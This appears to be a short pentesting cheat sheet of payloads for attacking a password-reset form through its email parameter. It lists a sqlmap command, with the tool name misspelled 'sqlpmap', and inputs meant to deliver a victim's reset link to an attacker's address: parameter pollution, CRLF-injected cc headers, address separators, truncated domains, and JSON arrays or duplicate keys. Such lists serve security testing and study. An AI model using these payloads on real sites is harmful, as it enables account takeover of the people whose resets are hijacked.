#### Try sqlmap in the email parameter as backend involvement may occur 
````
sqlpmap -r pass_reset.txt -p email
````


#### Double parameter (aka. HPP / HTTP parameter pollution):
- email=victim@xyz.tld&email=hacker@xyz.tld
#### Carbon copy:
- email=victim@xyz.tld%0a%0dcc:hacker@xyz.tld
#### Using separators:
- email=victim@xyz.tld,hacker@xyz.tld
- email=victim@xyz.tld%20hacker@xyz.tld
- email=victim@xyz.tld|hacker@xyz.tld
#### No domain:
- email=victim
- email=victim@xyz
#### JSON table:
- {"email":["victim@xyz.tld","hacker@xyz.tld"]}

#### two JSON emails
````
{"email":"victim@mail.com","email":"attacker@mail.com"}
````
